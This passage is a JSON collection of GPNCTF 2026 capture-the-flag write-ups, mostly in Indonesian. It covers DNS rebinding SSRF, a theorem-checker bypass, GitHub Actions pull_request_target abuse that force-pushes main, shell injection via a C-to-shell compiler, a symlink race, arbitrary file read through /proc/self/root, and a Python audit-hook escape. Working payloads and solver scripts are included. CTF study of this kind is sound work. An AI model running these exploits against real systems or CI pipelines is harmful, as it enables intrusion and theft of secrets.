    },
    {
      "title": "Payload",
      "content": "Request yang dikirim ke target:\n\n\n\nLangkahnya:\n\n1. Submit order dengan URL di atas.\n2. Tunggu status order berubah dari `COOKING`.\n3. Saat backend akhirnya fetch URL itu, rebinding membuat request mendarat di localhost.\n4. `/vip-meal` mengembalikan HTML yang berisi flag.\n5. Body itu muncul di `/notification/<id>`.",
      "code": "http://7f000001.08080808.rbndr.us/vip-meal"
    },
    {
      "title": "Hasil",
      "content": "Flag yang didapat:",
      "code": "GPNCTF{why_make_i7_cOMPl3x_when_yOu_CAn_MAkE_17_siMPL3}"
    },
    {
      "title": "Catatan",
      "content": "Saya sempat coba beberapa variasi hostname dan beberapa kali hasilnya masih `REJECTED`, jadi exploit ini memang agak probabilistik. Yang penting adalah tetap pakai hostname rebinding yang sama dan ulangi order sampai validation + fetch akhirnya kena urutan yang benar."
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{why_make_i7_cOMPl3x_when_yOu_CAn_MAkE_17_siMPL3}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-misc-customerservice",
  "title": "Customer Service",
  "ctfName": "GPNCTF 2026",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Challenge ini kelihatannya seperti checker theorem prover sederhana: kita kirim JSON dalam bentuk hex, server mem-parse item theory, lalu kalau bisa membuat theorem `false` tanpa asumsi maka flag keluar..",
  "problemDescription": "Challenge ini kelihatannya seperti checker theorem prover sederhana: kita kirim JSON dalam bentuk hex, server mem-parse item theory, lalu kalau bisa membuat theorem `false` tanpa asumsi maka flag keluar.\n\nSetelah baca `checker.py`, ada dua bug penting.\n\nYang pertama ada di alur item `thm`. Server memang memanggil `monitor.check_proof(item, rewrite=False)` dan memastikan status-nya `OK` atau `ProofOK`. Tapi sesudah itu theorem yang sama dimasukkan ke theory lewat:\n\n```python\nexts = item.get_extension()\nreport = theory.thy.checked_extend(exts)\n```\n\nMasalahnya, `items.Theorem.get_extension()` tidak pernah membawa proof yang barusan diverifikasi. Extension yang dihasilkan tetap:\n\n```python\nextension.Theorem(self.name, Thm(self.prop))\n```\n\nArtinya theorem tersebut ditambahkan sebagai **axiom**, bukan theorem terverifikasi.\n\nBug kedua ada di filter axiom:\n\n```python\nif (len(report.get_axioms())) > 1:\n    ...\nelif report.get_axioms() == 1 and item.ty != \"thm\":\n    ...\n```\n\nCabang kedua salah karena `report.get_axioms()` mengembalikan list, bukan integer. Jadi item `thm` yang diam-diam menambah satu axiom tidak pernah ditolak.\n\nDari situ exploit-nya sederhana:\n\n1. Kirim item bertipe `thm`.\n2. Isi `prop` dengan `false` supaya theorem yang tersimpan jadi `|- false`.\n3. Isi `proof` dengan proof lain yang valid, walaupun tidak membuktikan `false`.\n\nKenapa bisa? Karena `monitor.check_proof()` untuk mode `proof` hanya memeriksa proof yang dikirim valid secara internal. Dia tidak mencocokkan hasil proof itu dengan `item.prop`. Jadi proof `|- false = false` juga lolos.\n\nPayload final yang dipakai:\n\n```json\n{\n  \"content\": [\n    {\n      \"ty\": \"thm\",\n      \"name\": \"pwn\",\n      \"vars\": {\"false\": \"bool\"},\n      \"prop\": \"false\",\n      \"proof\": [\n        {\n          \"id\": \"0\",\n          \"rule\": \"reflexive\",\n          \"args\": \"false\",\n          \"prevs\": [],\n          \"th\": \"\"\n        }\n      ]\n    }\n  ]\n}\n```\n\nProof di atas sah karena rule `reflexive` menghasilkan `|- false = false` untuk variabel bernama `false` bertipe `bool`. Checker lalu berkata “proof check passed”, tetapi saat theorem dimasukkan ke theory, yang disimpan justru `|- false` sebagai axiom. Fungsi:\n\n```python\ntheorem_proves_false_unconditioned(thm)\n```\n\nlangsung mendeteksi theorem itu sebagai kontradiksi tanpa asumsi, lalu memanggil `win()`.\n\nFlag yang keluar:\n\n```text\nGPNCTF{Ex-uN4-LInea-v4cua-sequ1tUr-QUOdL18e7}\n```",
  "tools": [],
  "analysis": "",
  "solution": [
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nimport json\r\nimport socket\r\nimport ssl\r\n\r\n\r\nHOST = \"smoked-fish-fingers-on-braised-potato-xjyf.gpn24.ctf.kitctf.de\"\r\nPORT = 443\r\n\r\n\r\ndef build_payload():\r\n    payload = {\r\n        \"content\": [\r\n            {\r\n                \"ty\": \"thm\",\r\n                \"name\": \"pwn\",\r\n                \"vars\": {\"false\": \"bool\"},\r\n                \"prop\": \"false\",\r\n                \"proof\": [\r\n                    {\r\n                        \"id\": \"0\",\r\n                        \"rule\": \"reflexive\",\r\n                        \"args\": \"false\",\r\n                        \"prevs\": [],\r\n                        \"th\": \"\",\r\n                    }\r\n                ],\r\n            }\r\n        ]\r\n    }\r\n    return json.dumps(payload, separators=(\",\", \":\")).encode().hex().encode() + b\"\\n\"\r\n\r\n\r\ndef main():\r\n    payload = build_payload()\r\n    ctx = ssl.create_default_context()\r\n\r\n    with socket.create_connection((HOST, PORT), timeout=10) as sock:\r\n        with ctx.wrap_socket(sock, server_hostname=HOST) as ssock:\r\n            ssock.sendall(payload)\r\n            ssock.settimeout(5)\r\n\r\n            chunks = []\r\n            while True:\r\n                try:\r\n                    data = ssock.recv(4096)\r\n                except TimeoutError:\r\n                    break\r\n                if not data:\r\n                    break\r\n                chunks.append(data)\r\n\r\n    print(b\"\".join(chunks).decode(\"utf-8\", \"replace\"))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{Ex-uN4-LInea-v4cua-sequ1tUr-QUOdL18e7}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-misc-oldfood",
  "title": "Old food",
  "ctfName": "GPNCTF 2026",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Challenge ini kelihatannya cuma ngasih service `ncat`, tapi service itu sebenarnya dipakai buat bikin repo private di organisasi GitHub target.",
  "problemDescription": "Bug utamanya ada di workflow `ci.yml` yang jalan di event `pull_request_target`, lalu melakukan checkout ke `refs/pull/<id>/merge` sebelum menjalankan test. Kombinasi ini berbahaya karena workflow dieksekusi dengan konteks repo target, tapi kode yang dites berasal dari hasil merge PR. Kalau kita bisa bikin PR dari fork, kita bisa nanam test berbahaya dan menjalankan perintah di runner dengan `GITHUB_TOKEN` milik repo target.\n\nMasalahnya, token workflow itu cuma punya `contents: write`, bukan `workflows: write`. Jadi jalur lurus seperti “push workflow jahat baru ke target” mentok. Solusi yang kepakai justru lebih rapi: cari commit lama yang sudah punya workflow pembaca flag, lalu paksa `main` mundur ke commit itu dari dalam runner.",
  "tools": [],
  "analysis": "Setelah service dijalankan, saya dapat repo:\n\n`GPNCTF24-2/250845531_rhnataiet23-art_old-food-challenge`\n\nDari histori git repo target, kelihatan ada file workflow lama yang sudah dihapus:\n\n`.github/workflows/flag.yml`\n\nIsinya:\n\n```yaml\non:\n  pull_request_target:\n    branches:\n      - main\n\npermissions:\n  {}\n\njobs:\n  flag:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Get flag\n        run: echo ${{ secrets.FLAG }} | base64 | base64\n```\n\nWorkflow aktif di `main` saat enumerasi:\n\n```yaml\non:\n  push:\n    branches: [main]\n  pull_request_target:\n    branches: [main]\n\npermissions:\n  contents: write\n\njobs:\n  test:\n    ...\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: refs/pull/${{ github.event.pull_request.number }}/merge\n      - run: npm run test:coverage\n```\n\nPoin pentingnya ada dua:\n\n1. `pull_request_target` jalan dengan permission repo target.\n2. Kode yang dieksekusi di job test berasal dari hasil merge PR.\n\nArtinya kalau kita bisa buka PR dari fork, kita bisa sisipkan file test baru dan perintah itu akan dieksekusi di runner target.",
  "solution": [
    {
      "title": "Jalan buntu yang sempat dicoba",
      "content": "Push langsung ke repo target pakai kredensial user biasa ditolak.\n\nFork sempat terlihat seperti dimatikan, tapi lewat API GitHub ternyata masih bisa dibuat. Dari situ saya buka PR fork ke target dan mulai pakai jalur `pull_request_target`.\n\nPercobaan pertama adalah mendorong workflow jahat baru ke branch target dari dalam runner. Itu gagal dengan error seperti ini:\n\n\n\nJadi jelas `GITHUB_TOKEN` runner memang bisa `contents: write`, tapi tidak bisa membuat atau mengubah file di `.github/workflows`.",
      "code": "refusing to allow a GitHub App to create or update workflow `.github/workflows/leak.yml` without `workflows` permission"
    },
    {
      "title": "Ide yang akhirnya jadi",
      "content": "Kalau tidak bisa menulis workflow baru, pakai workflow lama yang sudah pernah ada.\n\nDi branch internal `feature/pr-checks`, commit lama `6d6b8d3` masih ada dan memang memuat `flag.yml`. Karena object commit itu sudah eksis di repo, runner tidak perlu membuat file workflow baru. Cukup:\n\n1. `git fetch` branch `feature/pr-checks`\n2. Ambil commit `feature-src~2`, yang jatuh ke `6d6b8d3`\n3. Buat branch `flagold` ke commit itu\n4. Force-push `main` ke commit lama yang sama\n\nPayload test yang dipakai di PR fork pada dasarnya begini:\n\n\n\nSaat job target jalan, log membuktikan dua push itu diterima:\n\n\n\nBegitu `main` sudah mundur ke `6d6b8d3`, workflow aktif repo target bukan lagi `ci.yml`, tapi `flag.yml`.",
      "code": "test(\"rewind target main to old flag workflow commit\", () => {\n  require(\"child_process\").execFileSync(\n    \"bash\",\n    [\n      \"-lc\",\n      `\nset -euo pipefail\ngit fetch --depth=10 origin feature/pr-checks:feature-src\ngit push -f origin feature-src~2:refs/heads/flagold\ngit push -f origin feature-src~2:refs/heads/main\n      `,\n    ],\n    { stdio: \"inherit\" },\n  );\n});"
    },
    {
      "title": "Kenapa exploit ini bekerja",
      "content": "Ini murni kombinasi tiga kesalahan desain:\n\n1. `pull_request_target` dipakai untuk PR yang bisa membawa kode tak dipercaya.\n2. Job test checkout ke merge result PR dan menjalankan code dari sana.\n3. Runner diberi `contents: write`, jadi kode jahat dari PR bisa mendorong ref di repo target.\n\nWalaupun `workflows: write` tidak ada, repo masih bisa diambil alih secara logis dengan memindahkan branch ke commit lama yang sudah mengandung workflow berbahaya."
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nimport base64\r\nimport json\r\nimport os\r\nimport re\r\nimport subprocess\r\nimport sys\r\nimport time\r\nfrom pathlib import Path\r\n\r\n\r\nROOT = Path(\"/home/kali/ctf/GPNCTF2026/misc/oldfood\")\r\nFORK = ROOT / \"forkrepo\"\r\nTARGET_REPO = \"GPNCTF24-2/250845531_rhnataiet23-art_old-food-challenge\"\r\nPR_NUMBER = 3\r\nPR_BRANCH = \"xrepo-pwn\"\r\n\r\nPAYLOAD = \"\"\"test(\"rewind target main to old flag workflow commit\", () => {\r\n  require(\"child_process\").execFileSync(\r\n    \"bash\",\r\n    [\r\n      \"-lc\",\r\n      `\r\nset -euo pipefail\r\ngit fetch --depth=10 origin feature/pr-checks:feature-src\r\ngit push -f origin feature-src~2:refs/heads/flagold\r\ngit push -f origin feature-src~2:refs/heads/main\r\n      `,\r\n    ],\r\n    { stdio: \"inherit\" },\r\n  );\r\n});\r\n\"\"\"\r\n\r\n\r\ndef run(cmd, cwd=None, check=True):\r\n  proc = subprocess.run(\r\n    cmd,\r\n    cwd=cwd,\r\n    text=True,\r\n    capture_output=True,\r\n  )\r\n  if check and proc.returncode != 0:\r\n    sys.stderr.write(proc.stdout)\r\n    sys.stderr.write(proc.stderr)\r\n    raise SystemExit(proc.returncode)\r\n  return proc\r\n\r\n\r\ndef git(args, cwd=FORK, check=True):\r\n  return run([\"git\", *args], cwd=cwd, check=check)\r\n\r\n\r\ndef gh(args, cwd=ROOT, check=True):\r\n  return run([\"gh\", *args], cwd=cwd, check=check)\r\n\r\n\r\ndef wait_for_new_run(workflow_name, previous_ids, timeout=180):\r\n  deadline = time.time() + timeout\r\n  while time.time() < deadline:\r\n    proc = gh(\r\n      [\"run\", \"list\", \"-R\", TARGET_REPO, \"--limit\", \"20\", \"--json\", \"databaseId,workflowName,status,conclusion,headBranch,event\"],\r\n      check=True,\r\n    )\r\n    runs = json.loads(proc.stdout)\r\n    for item in runs:\r\n      if item[\"workflowName\"] != workflow_name:\r\n        continue\r\n      if item[\"databaseId\"] in previous_ids:\r\n        continue\r\n      return item[\"databaseId\"]\r\n    time.sleep(3)\r\n  raise SystemExit(f\"timeout waiting for workflow {workflow_name}\")\r\n\r\n\r\ndef wait_for_completion(run_id, timeout=240):\r\n  deadline = time.time() + timeout\r\n  while time.time() < deadline:\r\n    proc = gh([\"run\", \"view\", str(run_id), \"-R\", TARGET_REPO, \"--json\", \"status,conclusion\"], check=True)\r\n    data = json.loads(proc.stdout)\r\n    if data[\"status\"] == \"completed\":\r\n      return data[\"conclusion\"]\r\n    time.sleep(3)\r\n  raise SystemExit(f\"timeout waiting for run {run_id}\")\r\n\r\n\r\ndef get_run_ids():\r\n  proc = gh([\"run\", \"list\", \"-R\", TARGET_REPO, \"--limit\", \"20\", \"--json\", \"databaseId,workflowName\"], check=True)\r\n  return {item[\"databaseId\"] for item in json.loads(proc.stdout)}\r\n\r\n\r\ndef extract_flag_from_log(run_id):\r\n  proc = gh([\"run\", \"view\", str(run_id), \"-R\", TARGET_REPO, \"--log\"], check=True)\r\n  joined = \"\"\r\n  for line in proc.stdout.splitlines():\r\n    if \"\\t\" not in line:\r\n      continue\r\n    text = line.split(\"\\t\", 2)[-1].strip()\r\n    if re.fullmatch(r\"[A-Za-z0-9+/=]{20,}\", text):\r\n      joined += text\r\n  if not joined:\r\n    raise SystemExit(\"encoded flag not found in logs\")\r\n  return base64.b64decode(base64.b64decode(joined)).decode().strip()\r\n\r\n\r\ndef main():\r\n  if not FORK.exists():\r\n    raise SystemExit(f\"missing fork repo at {FORK}\")\r\n\r\n  test_file = FORK / \"tests\" / \"pwn.test.js\"\r\n  test_file.write_text(PAYLOAD)\r\n\r\n  git([\"add\", \"tests/pwn.test.js\"])\r\n  git([\"commit\", \"-m\", \"solve: rewind main to flag commit\"], check=False)\r\n  git([\"push\", \"origin\", PR_BRANCH])\r\n\r\n  before = get_run_ids()\r\n  git([\"commit\", \"--allow-empty\", \"-m\", \"solve: trigger rewind run\"])\r\n  git([\"push\", \"origin\", PR_BRANCH])\r\n\r\n  ci_run = wait_for_new_run(\"CI\", before)\r\n  conclusion = wait_for_completion(ci_run)\r\n  if conclusion != \"success\":\r\n    raise SystemExit(f\"CI run {ci_run} ended with {conclusion}\")\r\n\r\n  before = get_run_ids()\r\n  git([\"commit\", \"--allow-empty\", \"-m\", \"solve: trigger flag workflow\"])\r\n  git([\"push\", \"origin\", PR_BRANCH])\r\n\r\n  flag_run = wait_for_new_run(\".github/workflows/flag.yml\", before)\r\n  conclusion = wait_for_completion(flag_run)\r\n  if conclusion != \"success\":\r\n    raise SystemExit(f\"flag run {flag_run} ended with {conclusion}\")\r\n\r\n  flag = extract_flag_from_log(flag_run)\r\n  print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n  main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{REsURrECt_thE_W0rKFL0w_RIp_ThE_6lOriOU5_daYS_0f_PulL_ReqU357_Tar6ET}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-misc-paradisenut",
  "title": "Paradise Nut",
  "ctfName": "GPNCTF 2026",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Writeup for challenge Paradise Nut",
  "problemDescription": "The challenge exposes a service that asks for one line of C code, runs it through `pnut-sh.sh`, and then executes the generated shell script:\n\n```sh\nprintf 'Enter your C code on a single line.\\n> '\nbash <(./pnut-sh.sh <(head -n1))\n```\n\nInside the container, `/flag` is only readable by root, but `/usr/bin/nl` is setuid root:\n\n```Dockerfile\nRUN echo \"$FLAG\" > /flag\nRUN chmod 400 /flag\nRUN chmod u+s /usr/bin/nl\n```\n\nSo the goal is not to read `/flag` directly. The goal is to make the generated shell script execute `nl /flag`.",
  "tools": [],
  "analysis": "",
  "solution": [
    {
      "title": "Root Cause",
      "content": "The bug is in the code generator for function calls.\n\n`_comp_fun_call_code()` assumes the callee is a normal identifier, extracts its value, and turns it into a shell function name:\n\n\n\nThat is already suspicious, because there is no validation that `name` is actually an identifier node.\n\n`_function_name()` then prepends an underscore and emits the underlying symbol text:\n\n\n\nIf the callee is a string literal expression instead of an identifier, the compiler still treats its internal symbol as if it were a function name. That means attacker-controlled string contents are copied directly into generated shell code.",
      "code": "_get_child name $node 0\n  ...\n  _get_val __t1 $name\n  _function_name __t1 $__t1"
    },
    {
      "title": "Turning It Into Command Injection",
      "content": "This C input:\n\n\n\nproduces shell code like:\n\n\n\nThat is a straight shell injection primitive.\n\nThe leading `_=` is important. The generator always prepends `_` to the “function name”, so I used a payload that starts with `=0;` to make the first command a harmless variable assignment:\n\n\n\nAfter that, arbitrary shell commands can run.",
      "code": "int main(){(\"=0;echo PWNED;#\")();}"
    },
    {
      "title": "Exploit",
      "content": "The final one-line payload is:\n\n\n\nWhy it works:\n\n1. The compiler accepts a string literal as the callee of a call expression.\n2. The shell backend converts that string into a command name without checking its type.\n3. The generated script executes `nl /flag`.\n4. `nl` is setuid root in the container, so it can read `/flag`.",
      "code": "int main(){(\"=0;nl /flag;#\")();}"
    },
    {
      "title": "Solver",
      "content": "The included `solve.py` opens a TLS connection, sends the payload, and prints the response.\n\nRun it with:",
      "code": "python3 solve.py"
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nimport socket\r\nimport ssl\r\n\r\n\r\nHOST = \"glazed-kimchi-infused-with-shaved-tomato-czzv.gpn24.ctf.kitctf.de\"\r\nPORT = 443\r\nPAYLOAD = 'int main(){(\"=0;nl /flag;#\")();}\\n'\r\n\r\n\r\ndef recv_until(sock: socket.socket, marker: bytes) -> bytes:\r\n    data = b\"\"\r\n    while marker not in data:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        data += chunk\r\n    return data\r\n\r\n\r\ndef main() -> None:\r\n    ctx = ssl.create_default_context()\r\n    with socket.create_connection((HOST, PORT)) as raw:\r\n        with ctx.wrap_socket(raw, server_hostname=HOST) as sock:\r\n            banner = recv_until(sock, b\"> \")\r\n            print(banner.decode(\"utf-8\", errors=\"replace\"), end=\"\")\r\n            sock.sendall(PAYLOAD.encode())\r\n\r\n            out = b\"\"\r\n            while True:\r\n                chunk = sock.recv(4096)\r\n                if not chunk:\r\n                    break\r\n                out += chunk\r\n\r\n    text = out.decode(\"utf-8\", errors=\"replace\")\r\n    print(text, end=\"\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "```text\nGPNCTF{li8c_GETS()_fANs_kEEP_0n_WinnINg!_IsN't_17_cONv3n13N7_th47_REPLY_is_NOT_8laCkLIST3d?}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-misc-supercat",
  "title": "Challenge: superCAT",
  "ctfName": "GPNCTF 2026",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Writeup for challenge Challenge: superCAT",
  "problemDescription": "",
  "tools": [],
  "analysis": "Setelah menganalisis `src/main.rs`, ditemukan kerentanan **TOCTOU (Time-of-Check Time-of-Use)** pada fungsi pengecekan permission.\n\nBinary `supercat` memiliki bit SUID set (berjalan sebagai root). Namun, ia mencoba untuk membatasi pembacaan file berdasarkan UID/GID pengguna yang menjalankannya dengan langkah-langkah berikut:\n1. Membaca metadata file target menggunakan `std::fs::metadata(file)`.\n2. Mengecek apakah pengguna memiliki hak akses baca (berdasarkan UID, GID, atau group lain).\n3. Jika pengecekan lolos, isi file dibaca menggunakan `fs::read_to_string(file)`.\n\nMasalahnya adalah `std::fs::metadata` mengikuti symbolic link. Jika kita memberikan path ke sebuah symlink, `metadata()` akan mengecek file yang dituju oleh symlink tersebut pada saat itu. Kemudian, `read_to_string()` akan membuka file yang dituju oleh symlink tersebut pada saat dipanggil.\n\nTerdapat jendela waktu (race window) antara pemanggilan `metadata()` dan `read_to_string()`. Jika kita bisa mengubah tujuan symlink di antara kedua pemanggilan tersebut, kita bisa melewati pengecekan permission.",
  "solution": [
    {
      "title": "Deskripsi Challenge",
      "content": "Challenge ini memberikan sebuah binary bernama `supercat` yang ditulis dalam bahasa Rust. Binary ini berfungsi sebagai pengganti `cat` yang \"highly opinionated\". Berdasarkan source code yang diberikan, binary ini melakukan pengecekan permission secara manual sebelum mengizinkan pembacaan file."
    },
    {
      "title": "Eksploitasi",
      "content": "Langkah-langkah eksploitasi yang dilakukan:\n1. Membuat file yang bisa kita baca (misal: `readable`).\n2. Membuat loop yang terus menerus mengubah tujuan sebuah symlink (misal: `link`) antara file `readable` dan file `/flag`.\n3. Menjalankan `supercat link` berulang kali.\n\nJika kita beruntung (memenangkan race condition), `supercat` akan memanggil `metadata()` saat `link` menunjuk ke `readable` (pengecekan lolos), namun memanggil `read_to_string()` saat `link` sudah diubah menunjuk ke `/flag` (flag terbaca karena binary berjalan sebagai root)."
    },
    {
      "title": "Script Solve",
      "content": "Script `solve.py` telah disediakan untuk mengotomatisasi proses ini melalui koneksi ncat."
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{ru5t_1S_Shit_cHAngE_mY_MInD}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-pwn-leftover",
  "title": "Leftovers",
  "ctfName": "GPNCTF 2026",
  "category": "Pwn",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "This challenge ships a Java web service together with a custom JDK and an `AOT` cache:",
  "problemDescription": "This challenge ships a Java web service together with a custom JDK and an `AOT` cache:\n\n- `leftovers.jar`\n- `my-jdk/`\n- `cache.aot`\n\nThe Java bytecode looks harmless at first glance. The interesting part is the runtime setup:\n\n```bash\n/my-jdk/bin/java -XX:AOTCache=cache.aot -jar leftovers.jar\n```\n\nSo the real question is not only \"what does the current JAR do?\", but also \"what stale code is still being pulled in from the code cache?\".",
  "tools": [],
  "analysis": "",
  "solution": [
    {
      "title": "1. Surface overview",
      "content": "The service exposes four endpoints:\n\n- `GET /`\n- `PUT /products/{name}`\n- `GET /images/{name}`\n- `POST /set-image-dir`\n\nFrom the JAR, `POST /set-image-dir` should require the password `supersecret`, and `GET /images/{name}` should read files from an image directory after sanitizing the product name.\n\nRunning the service locally with and without `-XX:AOTCache=cache.aot` immediately shows a mismatch:\n\n- without the cache, `supersecret` works\n- with the cache, `supersecret` fails\n\nThat is the first strong sign that the stale compiled code does not match the current bytecode anymore."
    },
    {
      "title": "2. Recovering the real password from the stale nmethod",
      "content": "I warmed up the relevant handlers locally and dumped the JIT/AOT code list with `jcmd`. That gave me a compiled entry for:\n\n- `de.kitctf.gpn24.leftovers.Server.lambda$main$15`\n\nThis is the password check used by `POST /set-image-dir`.\n\nDisassembling the verified entry with `gdb` showed that the stale version no longer compares against `\"supersecret\"`. Instead it:\n\n1. builds a 12-character constant\n2. lowercases/normalizes part of the user input\n3. reverses the string\n4. XORs it against the constant\n5. compares the result\n\nInverting that transformation gives the real accepted password:\n\n\n\nThat password works against the live target.",
      "code": "algomaster99"
    },
    {
      "title": "3. Turning `set-image-dir` into arbitrary file read",
      "content": "Once the old password is known, `POST /set-image-dir` becomes usable again.\n\nThe handler only checks that the supplied path exists and is a directory. It does not restrict where the directory can point. Because the service runs as root inside the container, `/proc/self/root` is especially useful: it gives a stable view of the container filesystem root.\n\nSo the exploit is:\n\n1. Set the image directory to `/proc/self/root`\n2. Create a product named `flag`\n3. Request `GET /images/flag`\n\nThat works because the image path is resolved as:\n\n\n\nWith `folderPath = /proc/self/root`, the service opens:\n\n\n\nwhich is the flag file in the container root.",
      "code": "folderPath / sanitize(product.name)"
    },
    {
      "title": "4. Exploit flow",
      "content": "These are the only requests needed:\n\n\n\n\n\n\n\nThe response returns the file contents directly, which yields:",
      "code": "POST /set-image-dir\n{\"password\":\"algomaster99\",\"newPath\":\"/proc/self/root\"}"
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env python3\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\nFLAG_RE = re.compile(r\"GPNCTF\\{[^}]+\\}\")\r\n\r\n\r\ndef main() -> int:\r\n    if len(sys.argv) != 2:\r\n        print(f\"usage: {sys.argv[0]} <base-url>\", file=sys.stderr)\r\n        return 1\r\n\r\n    base = sys.argv[1].rstrip(\"/\")\r\n    session = requests.Session()\r\n    session.timeout = 10\r\n\r\n    password = \"algomaster99\"\r\n\r\n    r = session.post(\r\n        f\"{base}/set-image-dir\",\r\n        json={\"password\": password, \"newPath\": \"/proc/self/root\"},\r\n        timeout=10,\r\n    )\r\n    r.raise_for_status()\r\n\r\n    product_name = \"flag\"\r\n    r = session.put(\r\n        f\"{base}/products/{product_name}\",\r\n        json={\r\n            \"product\": {\r\n                \"name\": product_name,\r\n                \"quantity\": 1,\r\n                \"bestBefore\": \"2026-06-05T00:00:00\",\r\n                \"notAfter\": \"2026-06-06T00:00:00\",\r\n            },\r\n            \"imageUrl\": None,\r\n        },\r\n        timeout=10,\r\n    )\r\n    r.raise_for_status()\r\n\r\n    r = session.get(f\"{base}/images/{product_name}\", timeout=10)\r\n    r.raise_for_status()\r\n\r\n    match = FLAG_RE.search(r.text)\r\n    if not match:\r\n        print(\"flag not found\", file=sys.stderr)\r\n        print(r.text)\r\n        return 2\r\n\r\n    print(match.group(0))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{13F7_OR_righT_COD3_cACHE_vaLIDAti0n_S4ys_600d_N1Gh7}",
  "lessonsLearned": []
},
  {
  "id": "gpnctf2026-pwn-nofreelunch",
  "title": "No free lunch",
  "ctfName": "GPNCTF 2026",
  "category": "Pwn",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Challenge ini kelihatannya seperti pyjail dengan satu import yang diizinkan, yaitu `heapq`.",
  "problemDescription": "Challenge ini kelihatannya seperti pyjail dengan satu import yang diizinkan, yaitu `heapq`. Deskripsinya juga sengaja mengarahkan kita ke patch CPython yang disediakan. Setelah dibaca, memang ada banyak patch aneh yang merusak mekanisme leak address, `id()`, `repr()`, hash pointer, dan beberapa bagian internal lain. Awalnya ini terlihat seperti challenge memory corruption di CPython. Memang ada bug use-after-free di `_heapq`, tapi ternyata challenge ini bisa diselesaikan jauh lebih simpel.",
  "tools": [],
  "analysis": "Patch `0001-Rewind-in-time.patch` mengubah `_heapq.heappushpop()`:\n\n```c\nPyObject* top = PyList_GET_ITEM(heap, 0);\n// Py_INCREF(top);\ncmp = PyObject_RichCompareBool(top, item, Py_LT);\n// Py_DECREF(top);\n```\n\nIni jelas bug lifetime object. Jika selama `__lt__` heap dimodifikasi dan elemen pertama hilang, `top` bisa menjadi dangling pointer. Saya sempat validasi ini lokal dan memang bisa memicu crash di CPython custom tersebut.\n\nTapi setelah melihat `server.py`, ada hal yang jauh lebih penting: audit hook dipasang sebagai lambda Python biasa, bukan C callback khusus, dan lambda itu mengambil nama `_exit` dari global scope modul.\n\nBaris kritisnya:\n\n```python\nfrom os import _exit\naddaudithook(lambda x,y:_exit(0))\n```\n\nDi Python, global name di dalam function/lambda di-resolve saat function dipanggil, bukan saat function dibuat. Artinya, kalau kita menimpa `_exit` setelah hook dipasang, lambda itu tidak lagi memanggil fungsi `os._exit` asli, tetapi memanggil value baru yang kita taruh di global `_exit`.\n\nItu berarti kita bisa mematikan seluruh jail hanya dengan:\n\n1. Menyimpan dulu referensi ke module `posix` lewat `_exit.__self__`\n2. Menimpa `_exit` menjadi fungsi no-op\n3. Menjalankan command yang kita mau lewat `posix.system`",
  "solution": [
    {
      "title": "Recon",
      "content": "File penting:\n\n- `src/server.py`\n- `src/0001-Rewind-in-time.patch`\n- `src/0002-Hopefully-remove-free-lunch.patch`\n\nBehavior service:\n\n1. Service menerima input Python line-by-line sampai ketemu `EOF`.\n2. Lalu service membuat file temporary yang isinya:\n\n\n\n3. Setelah itu input kita ditambahkan ke file tersebut.\n4. Script dijalankan dengan custom CPython hasil patch.\n\nJadi inti jail-nya bukan memblokir builtins atau eval, tapi memasang audit hook yang langsung memanggil `_exit(0)` saat ada event audit.",
      "code": "import heapq # the only import you'll need today\nfrom sys import addaudithook\nfrom os import _exit\naddaudithook(lambda x,y:_exit(0))"
    },
    {
      "title": "Kenapa payload pertama harus hati-hati",
      "content": "Kalau langsung menulis:\n\n\n\nitu salah, karena setelah `_exit` ditimpa jadi function Python biasa, object itu tidak punya atribut `__self__`.\n\nUrutan yang benar:\n\n\n\n`_exit.__self__` di sini adalah module `posix` built-in. Dari situ kita bisa memanggil `system()` langsung.",
      "code": "_exit=lambda x:None\np=_exit.__self__"
    },
    {
      "title": "Payload final",
      "content": "Payload yang dikirim ke service:\n\n\n\nBegitu `system()` memicu audit event, hook tetap dipanggil, tetapi sekarang `_exit(0)` sudah berubah menjadi lambda no-op. Jadi proses tidak mati, command jalan normal, dan binary setuid `/challenge/read_flag` mencetak flag.",
      "code": "p=_exit.__self__\n_exit=lambda x:None\np.system('/challenge/read_flag')\nEOF"
    },
    {
      "title": "Solver",
      "content": "Solver final ada di [exploit.py](/home/kali/ctf/GPNCTF2026/pwn/NofreeLunch/no-free-lunch/exploit.py).\n\nJalankan dengan:",
